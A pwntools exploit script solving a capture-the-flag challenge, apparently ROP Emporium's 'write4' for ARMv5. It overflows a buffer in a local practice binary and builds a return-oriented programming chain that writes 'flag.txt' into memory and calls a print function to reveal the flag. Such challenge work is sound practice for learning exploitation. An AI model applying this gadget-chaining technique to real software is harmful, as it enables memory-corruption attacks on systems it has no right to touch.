#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./write4_armv5")

offset = 36
junk = b"A" * offset

data = 0x21024

print_file = p32(0x104b0)

pop_r0_pc = p32(0x105f4)
pop_r3_r4_pc = p32(0x105f0)
str_r3_r4_pop_r3_r4_pc = p32(0x105ec)

payload  = b""
payload += junk
payload += pop_r3_r4_pc
payload += b"flag" + p32(data) + str_r3_r4_pop_r3_r4_pc
payload += b".txt" + p32(data + 4) + str_r3_r4_pop_r3_r4_pc
payload += b"A" * 8
payload += pop_r0_pc + p32(data) + print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.success(f"Flag: {flag}")

